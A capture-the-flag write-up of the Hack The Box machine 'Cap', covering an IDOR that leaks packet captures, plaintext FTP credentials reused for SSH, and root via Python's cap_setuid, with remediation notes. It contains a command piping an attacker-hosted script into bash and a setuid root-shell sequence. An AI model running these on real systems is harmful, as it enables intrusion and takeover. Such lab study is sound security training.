Machine Name: Cap 
Platform : Hack the box 
difficulty: Easy
target IP: 10.129.127.35 

**Objective:** Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plain-text credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.

### Methodology

The following penetration testing methodology was followed:

- Information Gathering
- Enumeration
- Service Analysis
- Vulnerability Identification
- Initial Access
- Privilege Escalation
- Flag Collection
### Enumeration:

**nmap:**
```
nmap -A -T4 -p- -sC -sV <Target-IP>
```
![[Pasted image 20260729223815.png]]

| Port | State | Service | Version                                                      |
| ---- | ----- | ------- | ------------------------------------------------------------ |
| 21   | open  | ftp     | vsftpd 3.0.3                                                 |
| 22   | open  | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) |
| 80   | open  | http    | Gunicorn                                                     |
**Analysis:**
Three services were discovered:
- FTP service running vsftpd 3.0.3
- SSH service
- Web application hosted on port 80
No immediate critical vulnerability was identified from the service versions alone.

### FTP Enumeration :
The FTP version was verified using:

```
nc <Target-IP> 21
```
check the version of the searchsploit :
![[Pasted image 20260803192823.png]]
```
searchsploit vsftpd
```
Although several exploits existed for older versions of vsftpd, version **3.0.3** only showed a denial-of-service entry and no practical remote code execution exploit.

Anonymous login was also tested:
```
ftp <Target-IP>
```
**Username:**
```
anonymous
```
**Result:**
```
530 Login incorrect
```
![[Pasted image 20260803193203.png]]
Anonymous FTP access was disabled, so no further information could be gathered from the FTP service.

### Version Verification:
The release history of vsftpd was verified by reviewing its changelog in google.

Commands used:
```
wget https://fossies.org/diffs/vsftpd/3.0.2_vs_3.0.3/Changelog-diff.html

exiftool Changelog-diff.html
```
![[Pasted image 20260729233715.png]]
The HTML metadata was inspected to confirm the release timeline of version 3.0.3.This step helped verify whether any publicly known vulnerabilities affected the installed version.

### Web Enumeration:
Browsing to port 80 revealed a dashboard-based web application.
![[Pasted image 20260803193235.png]]

The **navigation menu** contained:
- Dashboard
- Security Snapshot
- IP Config
- Network Status
![[Pasted image 20260803193302.png|379]]

The **Security Snapshot** functionality allowed downloading packet capture (PCAP) files. `2.pcap`

### Insecure Direct Object Reference (IDOR):
Initially, the latest PCAP file contained no useful information.

The URL structure was observed:
```
/data/2
```

The numerical identifier was manually modified:
![[Pasted image 20260803212312.png|399]]
```
/data/0
```
This successfully downloaded another user's packet capture.
The application failed to verify whether the authenticated user was authorized to access another user's PCAP file.

### Packet Analysis:
The downloaded PCAP file was opened using Wireshark.

**Filter used:**
```
tcp.stream eq 3
```
The FTP conversation contained plaintext credentials.
![[Pasted image 20260803212340.png|361]]
**Recovered credentials:**
```
Username: nathan
Password: Buck3tH4TF0RM3!
```
Sensitive credentials were transmitted without encryption and exposed inside the captured network traffic.

### Initial Access:
**FTP Login:**
The recovered credentials successfully authenticated to FTP.
![[Pasted image 20260803212524.png|253]]
```
ftp <Target-IP>
```

The `user.txt` flag was downloaded.
```
get user.txt
```
![[Pasted image 20260803212548.png|230]]

### SSH Login:
The same credentials were reused for SSH access.
```
ssh nathan@<Target-IP>
```
This provided a shell as user **nathan**.
![[Pasted image 20260803212840.png]]

### Privilege Escalation:

**LinPEAS Enumeration:**
LinPEAS was transferred to the target.
Set attacker machine:
```
cp ~/tools/PEASS-ng/linPEAS/linpeas.sh .

python3 -m http.server
```

Victim machine:
```
curl http://<Attacker-IP>:8000/linpeas.sh | bash
```
![[Pasted image 20260803213334.png|469]]

LinPEAS identified an unusual Linux capability assigned to Python.
![[Pasted image 20260803213710.png]]
```
/usr/bin/python3.8 = cap_setuid
```
This was the critical privilege escalation vector.

Linux capabilities divide root privileges into smaller permission sets ,`cap_setuid` allows a process to change its user ID.

Since Python possessed this capability, it could directly switch its UID to **0 (root)**.

### Exploitation
**Verify Current User:**
```
import os
os.system("whoami")
```
Output: `nathan`
The Python process is running with the current user's privileges.

**Change Process UID to Root:**
```
os.setuid(0)
```

**Verify:**
```
os.system("whoami")
```
Output: `root`

**Spawn a Root Shell:** The new Bash shell inherits Python's **root** privileges.
```
os.system("/bin/bash")
```
Output: `root@cap:~#`
![[Pasted image 20260803214534.png]]

### Root Flag:
- Navigate to the root directory. `cd /root`
- Display the flag: `cat root.txt`
![[Pasted image 20260803214746.png]]
The privilege escalation was successful and root access was achieved.

### Attack Chain Summary:
![[Pasted image 20260803214907.png]]

### Risk analysis:

1. **Insecure Direct Object Reference (IDOR):**

**Risk:** Users can access other users' PCAP files by modifying the URL.
**Impact:** Exposure of sensitive data and user credentials, leading to unauthorized access.
**Remediation:** Implement proper authorization checks and validate resource ownership before granting access.

2. **Plaintext FTP Credentials:**

**Risk:** FTP credentials are transmitted in plaintext and can be captured from network traffic.
**Impact:** Attackers can steal credentials and gain unauthorized access to services.
**Remediation:** Replace FTP with SFTP or SCP and disable plaintext authentication.

3. **Misconfigured Linux Capability (`cap_setuid`):**

**Risk:** The Python binary can elevate privileges to root due to the `cap_setuid` capability.
**Impact:** An attacker can obtain full root access and completely compromise the system.
**Remediation:** Remove unnecessary capabilities and apply the principle of least privilege.
### Conclusion:
The compromise of the **Cap** machine resulted from a chain of security weaknesses rather than a single flaw. The web application exposed sensitive packet captures through an **Insecure Direct Object Reference (IDOR)** vulnerability, allowing an attacker to retrieve another user's FTP credentials from network traffic. These credentials were reused for SSH access, providing an initial foothold. During post-exploitation enumeration, a misconfigured Linux capability (`cap_setuid`) assigned to the Python interpreter enabled privilege escalation to **root**. This machine demonstrates the importance of proper access controls, avoiding plaintext protocols such as FTP, preventing credential reuse, and carefully managing Linux capabilities to reduce the risk of full system compromise.